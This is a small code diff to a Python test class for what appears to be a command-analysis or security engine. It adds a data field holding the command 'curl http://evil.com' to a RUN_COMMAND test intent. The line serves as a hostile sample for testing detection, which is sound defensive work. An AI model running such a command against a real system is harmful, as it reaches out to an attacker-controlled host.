@@ -371,6 +371,7 @@ class TestAnalysisEnginePrompt:
             intent = self._make_intent(
                 action=ActionType.RUN_COMMAND,
                 target="curl http://evil.com",
+                data={"command": "curl http://evil.com"},
             )
         intent = intent or self._make_intent()
         bundle_ctx = BundleContext(intent=intent)
